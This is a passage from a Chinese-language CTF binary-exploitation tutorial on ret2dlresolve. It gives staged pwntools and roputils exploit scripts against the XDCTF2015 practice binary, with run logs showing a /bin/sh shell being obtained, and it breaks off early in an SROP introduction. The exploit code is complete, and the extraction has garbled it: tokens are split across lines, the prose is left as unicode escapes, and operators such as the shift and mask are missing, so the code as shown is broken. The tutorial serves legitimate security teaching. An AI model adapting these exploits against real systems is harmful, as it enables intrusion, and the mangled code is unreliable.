4\n\n\nstage3\u4e2d\uff0c\u6211\u4eec\u63a7\u5236\u4e86\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u5185\u5bb9\u4e0ewrite\u539f\u6765\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u4e00\u81f4\uff0c\u8fd9\u6b21\uff0c\u6211\u4eec\u5c06\u6784\u9020\u5c5e\u4e8e\u6211\u4eec\u81ea\u5df1\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5e76\u4e14\u4f2a\u9020\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u7b26\u53f7\u3002\u9996\u5148\uff0c\u6211\u4eec\u6839\u636ewrite\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info=0x607\u53ef\u4ee5\u77e5\u9053\uff0cwrite\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u7684\u4e0b\u6807\u4e3a0x607\n8=0x6\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u77e5\u9053write\u5bf9\u5e94\u7684\u7b26\u53f7\u5730\u5740\u4e3a0x8048238\u3002\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 objdump -s -EL -j  .dynsym main\n\nmain\uff1a     \u6587\u4ef6\u683c\u5f0f elf32-i386\n\nContents of section .dynsym:\n 80481d8 \n00000000\n \n00000000\n \n00000000\n \n00000000\n  ................\n 80481e8 \n33000000\n \n00000000\n \n00000000\n \n12000000\n  \n3\n...............\n 80481f8 \n27000000\n \n00000000\n \n00000000\n \n12000000\n  \n...............\n \n8048208\n \n52000000\n \n00000000\n \n00000000\n \n20000000\n  R........... ...\n \n8048218\n \n20000000\n \n00000000\n \n00000000\n \n12000000\n   ...............\n \n8048228\n 3a000000 \n00000000\n \n00000000\n \n12000000\n  :...............\n \n8048238\n 4c000000 \n00000000\n \n00000000\n \n12000000\n  L...............\n \n8048248\n 2c000000 44a00408 \n04000000\n 11001a00  ,...D...........\n \n8048258\n 0b000000 3c860408 \n04000000\n \n11001000\n  ....\n...........\n \n8048268\n 1a000000 40a00408 \n04000000\n 11001a00  ....@...........\n\n\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u7684\u5176\u5b9e\u662f\u5c0f\u7aef\u6a21\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u5de5\u8f6c\u6362\u3002\u6b64\u5916\uff0c\u6bcf\u4e2a\u7b26\u53f7\u5360\u7528\u7684\u5927\u5c0f\u4e3a16\u4e2a\u5b57\u8282\u3002\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack privot to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack privot, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write sh=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nrel_plt\n \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n\n\ndynsym\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynsym\n)\n.\nheader\n.\nsh_addr\n\n\ndynstr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynstr\n)\n.\nheader\n.\nsh_addr\n\n\n\n### making fake write symbol\n\n\nfake_sym_addr\n \n=\n \nbase_stage\n \n+\n \n32\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n\n                \n)\n  \n# since the size of item(Elf32_Symbol) of dynsym is 0x10\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\nindex_dynsym\n \n=\n \n(\n\n    \nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n  \n# calculate the dynsym index of write\n\n\nfake_write_sym\n \n=\n \nflat\n([\n0x4c\n,\n \n0\n,\n \n0\n,\n \n0x12\n])\n\n\n\n### making fake write relocation\n\n\n\n## making base_stage+24 ---\n fake reloc\n\n\nindex_offset\n \n=\n \nbase_stage\n \n+\n \n24\n \n-\n \nrel_plt\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nr_info\n \n=\n \n(\nindex_dynsym\n \n \n8\n)\n \n|\n \n0x7\n\n\nfake_write_reloc\n \n=\n \nflat\n([\nwrite_got\n,\n \nr_info\n])\n\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nindex_offset\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\n1\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n80\n)\n\n\nrop\n.\nraw\n(\nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\nfake_write_reloc\n)\n  \n# fake write reloc\n\n\nrop\n.\nraw\n(\na\n \n*\n \nalign\n)\n  \n# padding\n\n\nrop\n.\nraw\n(\nfake_write_sym\n)\n  \n# fake write symbol\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u5177\u4f53\u6548\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage4.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n128795\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 5\n\n\n\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u5728\u9636\u6bb54\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u8fdb\u4e00\u6b65\u4f7f\u5f97write\u7b26\u53f7\u7684st_name\u6307\u5411\u6211\u4eec\u81ea\u5df1\u6784\u9020\u7684\u5b57\u7b26\u4e32\u3002\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack privot to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack privot, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write sh=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nrel_plt\n \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n\n\ndynsym\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynsym\n)\n.\nheader\n.\nsh_addr\n\n\ndynstr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynstr\n)\n.\nheader\n.\nsh_addr\n\n\n\n### making fake write symbol\n\n\nfake_sym_addr\n \n=\n \nbase_stage\n \n+\n \n32\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n\n                \n)\n  \n# since the size of item(Elf32_Symbol) of dynsym is 0x10\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\nindex_dynsym\n \n=\n \n(\n\n    \nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n  \n# calculate the dynsym index of write\n\n\n## plus 10 since the size of Elf32_Sym is 16.\n\n\nst_name\n \n=\n \nfake_sym_addr\n \n+\n \n0x10\n \n-\n \ndynstr\n\n\nfake_write_sym\n \n=\n \nflat\n([\nst_name\n,\n \n0\n,\n \n0\n,\n \n0x12\n])\n\n\n\n### making fake write relocation\n\n\n\n## making base_stage+24 ---\n fake reloc\n\n\nindex_offset\n \n=\n \nbase_stage\n \n+\n \n24\n \n-\n \nrel_plt\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nr_info\n \n=\n \n(\nindex_dynsym\n \n \n8\n)\n \n|\n \n0x7\n\n\nfake_write_reloc\n \n=\n \nflat\n([\nwrite_got\n,\n \nr_info\n])\n\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nindex_offset\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\n1\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n80\n)\n\n\nrop\n.\nraw\n(\nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\nfake_write_reloc\n)\n  \n# fake write reloc\n\n\nrop\n.\nraw\n(\na\n \n*\n \nalign\n)\n  \n# padding\n\n\nrop\n.\nraw\n(\nfake_write_sym\n)\n  \n# fake write symbol\n\n\nrop\n.\nraw\n(\nwrite\n\\x00\n)\n  \n# there must be a \\x00 to mark the end of string\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage5.py      \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n129249\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 6\n\n\n\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u539f\u5148\u7684write\u5b57\u7b26\u4e32\u4fee\u6539\u4e3asystem\u5b57\u7b26\u4e32\uff0c\u540c\u65f6\u4fee\u6539write\u7684\u53c2\u6570\u4e3asystem\u7684\u53c2\u6570\u5373\u53ef\u83b7\u53d6shell\u3002\u8fd9\u662f\u56e0\u4e3a\uff0cdl_resolve\u6700\u7ec8\u4f9d\u8d56\u7684\u662f\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u5373\u4f7f\u6211\u4eec\u7ed9\u4e86\u4e00\u4e2a\u5047\u7684\u5b57\u7b26\u4e32\u5b83\u4ecd\u7136\u4f1a\u53bb\u89e3\u6790\u5e76\u6267\u884c\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack privot to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack privot, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write sh=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nrel_plt\n \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n\n\ndynsym\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynsym\n)\n.\nheader\n.\nsh_addr\n\n\ndynstr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynstr\n)\n.\nheader\n.\nsh_addr\n\n\n\n### making fake write symbol\n\n\nfake_sym_addr\n \n=\n \nbase_stage\n \n+\n \n32\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n\n                \n)\n  \n# since the size of item(Elf32_Symbol) of dynsym is 0x10\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\nindex_dynsym\n \n=\n \n(\n\n    \nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n  \n# calculate the dynsym index of write\n\n\n## plus 10 since the size of Elf32_Sym is 16.\n\n\nst_name\n \n=\n \nfake_sym_addr\n \n+\n \n0x10\n \n-\n \ndynstr\n\n\nfake_write_sym\n \n=\n \nflat\n([\nst_name\n,\n \n0\n,\n \n0\n,\n \n0x12\n])\n\n\n\n### making fake write relocation\n\n\n\n## making base_stage+24 ---\n fake reloc\n\n\nindex_offset\n \n=\n \nbase_stage\n \n+\n \n24\n \n-\n \nrel_plt\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nr_info\n \n=\n \n(\nindex_dynsym\n \n \n8\n)\n \n|\n \n0x7\n\n\nfake_write_reloc\n \n=\n \nflat\n([\nwrite_got\n,\n \nr_info\n])\n\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nindex_offset\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n82\n)\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\nfake_write_reloc\n)\n  \n# fake write reloc\n\n\nrop\n.\nraw\n(\na\n \n*\n \nalign\n)\n  \n# padding\n\n\nrop\n.\nraw\n(\nfake_write_sym\n)\n  \n# fake write symbol\n\n\nrop\n.\nraw\n(\nsystem\n\\x00\n)\n  \n# there must be a \\x00 to mark the end of string\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nprint\n \nrop\n.\ndump\n()\n\n\nprint\n \nlen\n(\nrop\n.\nchain\n())\n\n\nrop\n.\nraw\n(\nsh\n \n+\n \n\\x00\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211'/bin/sh'\u7684\u504f\u79fb\u6211\u4fee\u6539\u4e3a\u4e8682\uff0c\u8fd9\u662f\u56e0\u4e3apwntools\u4e2d\u5b83\u4f1a\u81ea\u52a8\u5e2e\u4f60\u5bf9\u9f50\u5b57\u7b26\u4e32\u3002\u3002\u3002\u4e0b\u9762\u8fd9\u4e00\u884c\u8bf4\u660e\u4e86\u95ee\u9898\u3002\n\n\n0x0050:           \naara\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage6.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n130415\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n0x0000:        0x8048380\n0x0004:           0x2528\n0x0008:           \nbbbb\n \nbbbb\n\n0x000c:        0x804a892\n0x0010:           \nbbbb\n \nbbbb\n\n0x0014:           \nbbbb\n \nbbbb\n\n0x0018: \n\\x1c\\xa0\\x04\\x08\n \n\\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00\n\n0x001c:  \n\\x07i\\x02\\x00\n\n0x0020:           \naaaa\n \naaaaaaaa\n\n0x0024:           \naaaa\n\n0x0028:  \n\\x00\n\\x00\\x00\n \n\\x00\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00\n\n0x002c: \n\\x00\\x00\\x00\\x00\n\n0x0030: \n\\x00\\x00\\x00\\x00\n\n0x0034: \n\\x12\\x00\\x00\\x00\n\n0x0038:           \nsyst\n \nsystem\\x00\n\n0x003c:        \nem\\x00o\n\n0x0040:             \naa\n\n0x0044:           \naaaa\n \naaaaaaaaaaaaaa\n\n0x0048:           \naaaa\n\n0x004c:           \naaaa\n\n0x0050:           \naara\n\n\n82\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh: \n1\n: xa: not found\n$ ls\ncore  main.c     stage2.py  stage4.py  stage6.py\nmain  stage1.py  stage3.py  stage5.py\n\n\n\n\n\u5de5\u5177\u653b\u51fb\n\n\n\u6839\u636e\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5bb9\u6613\u53ef\u4ee5\u7406\u89e3\u8fd9\u4e2a\u653b\u51fb\u4e86\u3002\u4e0b\u9762\u6211\u4eec\u76f4\u63a5\u4f7f\u7528roputil\u6765\u8fdb\u884c\u653b\u51fb\u3002\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \nroputils\n \nimport\n \n*\n\n\nfrom\n \npwn\n \nimport\n \nprocess\n\n\nfrom\n \npwn\n \nimport\n \ngdb\n\n\nfrom\n \npwn\n \nimport\n \ncontext\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\nr\n.\nrecv\n()\n\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\noffset\n \n=\n \n112\n\n\nbss_base\n \n=\n \nrop\n.\nsection\n(\n.bss\n)\n\n\nbuf\n \n=\n \nrop\n.\nfill\n(\noffset\n)\n\n\n\nbuf\n \n+=\n \nrop\n.\ncall\n(\nread\n,\n \n0\n,\n \nbss_base\n,\n \n100\n)\n\n\n## used to call dl_Resolve()\n\n\nbuf\n \n+=\n \nrop\n.\ndl_resolve_call\n(\nbss_base\n \n+\n \n20\n,\n \nbss_base\n)\n\n\nr\n.\nsend\n(\nbuf\n)\n\n\n\nbuf\n \n=\n \nrop\n.\nstring\n(\n/bin/sh\n)\n\n\nbuf\n \n+=\n \nrop\n.\nfill\n(\n20\n,\n \nbuf\n)\n\n\n## used to make faking data, such relocation, Symbol, Str\n\n\nbuf\n \n+=\n \nrop\n.\ndl_resolve_data\n(\nbss_base\n \n+\n \n20\n,\n \nsystem\n)\n\n\nbuf\n \n+=\n \nrop\n.\nfill\n(\n100\n,\n \nbuf\n)\n\n\nr\n.\nsend\n(\nbuf\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u5173\u4e8edl_resolve_call\u4e0edl_resolve_data\u7684\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003roputils.py\u7684\u6e90\u7801\uff0c\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cdl_resolve\u6267\u884c\u5b8c\u4e4b\u540e\u4e5f\u662f\u9700\u8981\u6709\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\u7684\u3002\n\n\n\u6548\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python roptool.py                       \n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n6114\n\n\n[\nDEBUG\n]\n Received 0x17 bytes:\n    \nWelcome to XDCTF2015~!\\n\n\n\n[\nDEBUG\n]\n Sent 0x94 bytes:\n    \n00000000\n  \n46\n 4c \n68\n \n78\n  \n52\n \n36\n \n67\n 6e  \n65\n \n47\n \n53\n \n58\n  \n71\n \n77\n \n51\n \n49\n  \u2502FLhx\u2502R6gn\u2502eGSX\u2502qwQI\u2502\n    \n00000010\n  \n32\n \n43\n 6c \n49\n  \n77\n \n76\n \n51\n \n33\n  \n47\n \n49\n 4a \n59\n  \n50\n \n74\n 6c \n38\n  \u25022ClI\u2502wvQ3\u2502GIJY\u2502Ptl8\u2502\n    \n00000020\n  \n57\n \n54\n \n68\n 4a  \n63\n \n48\n \n39\n \n62\n  \n46\n \n55\n \n52\n \n58\n  \n50\n \n73\n \n38\n \n64\n  \u2502WThJ\u2502cH9b\u2502FURX\u2502Ps8d\u2502\n    \n00000030\n  \n72\n 4c \n38\n \n63\n  \n50\n \n79\n \n37\n \n73\n  \n55\n \n45\n 7a \n32\n  6f \n59\n 5a \n42\n  \u2502rL8c\u2502Py7s\u2502UEz2\u2502oYZB\u2502\n    \n00000040\n  \n76\n \n59\n \n32\n \n43\n  \n74\n \n75\n \n77\n 6f  \n70\n \n56\n \n61\n \n44\n  6a \n73\n \n35\n 6b  \u2502vY2C\u2502tuwo\u2502pVaD\u2502js5k\u2502\n    \n00000050\n  \n41\n \n77\n \n78\n \n77\n  \n49\n \n72\n 7a \n49\n  \n70\n 4d \n31\n \n67\n  \n52\n 6f \n44\n 6f  \u2502Awxw\u2502IrzI\u2502pM1g\u2502RoDo\u2502\n    \n00000060\n  \n43\n \n44\n \n43\n 6e  \n45\n \n31\n \n50\n \n48\n  \n53\n \n73\n \n64\n \n30\n  6d \n54\n 7a 5a  \u2502CDCn\u2502E1PH\u2502Ssd0\u2502mTzZ\u2502\n    \n00000070\n  a0 \n83\n \n04\n \n08\n  \n19\n \n86\n \n04\n \n08\n  \n00\n \n00\n \n00\n \n00\n  \n40\n a0 \n04\n \n08\n  \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502@\u00b7\u00b7\u00b7\u2502\n    \n00000080\n  \n64\n \n00\n \n00\n \n00\n  \n80\n \n83\n \n04\n \n08\n  \n28\n 1d \n00\n \n00\n  \n79\n \n83\n \n04\n \n08\n  \u2502d\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n(\n\u00b7\u00b7\u00b7\u2502y\u00b7\u00b7\u00b7\u2502\n    \n00000090\n  \n40\n a0 \n04\n \n08\n                                         \u2502@\u00b7\u00b7\u00b7\u2502\u2502\n    \n00000094\n\n\n[\nDEBUG\n]\n Sent 0x64 bytes:\n    \n00000000\n  2f \n62\n \n69\n 6e  2f \n73\n \n68\n \n00\n  \n73\n \n52\n \n46\n \n66\n  \n57\n \n43\n \n59\n \n52\n  \u2502/bin\u2502/sh\u00b7\u2502sRFf\u2502WCYR\u2502\n    \n00000010\n  \n66\n 4c \n35\n \n52\n  \n78\n \n49\n 4c \n53\n  \n54\n a0 \n04\n \n08\n  \n07\n e9 \n01\n \n00\n  \u2502fL5R\u2502xILS\u2502T\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n    \n00000020\n  6e 6b \n45\n \n32\n  \n52\n \n76\n \n73\n 6c  \n00\n 1e \n00\n \n00\n  \n00\n \n00\n \n00\n \n00\n  \u2502nkE2\u2502Rvsl\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n    \n00000030\n  \n00\n \n00\n \n00\n \n00\n  \n12\n \n00\n \n00\n \n00\n  \n73\n \n79\n \n73\n \n74\n  \n65\n 6d \n00\n \n74\n  \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502syst\u2502em\u00b7t\u2502\n    \n00000040\n  5a 4f 4e 6c  6c \n73\n 4b 5a  \n76\n \n53\n \n48\n 6e  \n38\n \n37\n \n49\n \n47\n  \u2502ZONl\u2502lsKZ\u2502vSHn\u250287IG\u2502\n    \n00000050\n  \n69\n \n49\n \n52\n 6c  \n50\n \n44\n \n38\n \n67\n  \n45\n \n77\n \n75\n 6c  \n72\n \n47\n 6f \n67\n  \u2502iIRl\u2502PD8g\u2502Ewul\u2502rGog\u2502\n    \n00000060\n  \n55\n \n41\n \n52\n 4f                                         \u2502UARO\u2502\u2502\n    \n00000064\n\n\n[\n*\n]\n Switching to interactive mode\n$ ls\n\n[\nDEBUG\n]\n Sent 0x3 bytes:\n    \nls\\n\n\n\n[\nDEBUG\n]\n Received 0x8d bytes:\n    \ncore\\t     main    roptool.py   roputils.pyc\\tstage2.py  stage4.py  stage6.py\\n\n\n    \n__init__.py  main.c  roputils.py  stage1.py\\tstage3.py  stage5.py\\n\n\ncore         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py\n__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py\n\n\n\n\n\u9898\u76ee\n\n\nSROP\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\nSROP(Sigreturn Oriented Programming)\u4e8e2014\u5e74\u88abVrije Universiteit Amsterdam\u7684Erik Bosman\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76\nFraming Signals \u2014 A Return to Portable Shellcode\n\u53d1\u8868\u5728\u5b89\u5168\u9876\u7ea7\u4f1a\u8bae\nOakland 2014\n\u4e0a\uff0c\u88ab\u8bc4\u9009\u4e3a\u5f53\u5e74\u7684\nBest Student Papers\n\u3002\u5176\u4e2d\u76f8\u5173\u7684paper\u4ee5\u53caslides\u7684\u94fe\u63a5\u5982\u4e0b\uff1a\n\n\npaper\n\n\nslides\n\n\n\u5176\u4e2d\uff0c\nsigreturn\n\u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5728\u7c7bunix\u7cfb\u7edf\u53d1\u751fsignal\u7684\u65f6\u5019\u4f1a\u88ab\u95f4\u63a5\u5730\u8c03\u7528\u3002\n\n\nsignal\u673a\u5236\n\n\nsignal\u673a\u5236\u662f\u7c7bunix\u7cfb\u7edf\u4e2d\u8fdb\u7a0b\u4e4b\u95f4\u76f8\u4e92\u4f20\u9012\u4fe1\u606f\u7684\u4e00\u79cd\u65b9\u6cd5\u3002\u4e00\u822c\uff0c\u6211\u4eec\u4e5f\u79f0\u5176\u4e3a\u8f6f\u4e2d\u65ad\u4fe1\u53f7\uff0c\u6216\u8005\u8f6f\u4e2d\u65ad\u3002\u6bd4\u5982\u8bf4\uff0c\u8fdb\u7a0b\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528kill\u6765\u53d1\u9001\u8f6f\u4e2d\u65ad\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4fe1\u53f7\u673a\u5236\u5e38\u89c1\u7684\u6b65\u9aa4\u5982\u4e0b\u56fe\u6240\u793a\uff1a\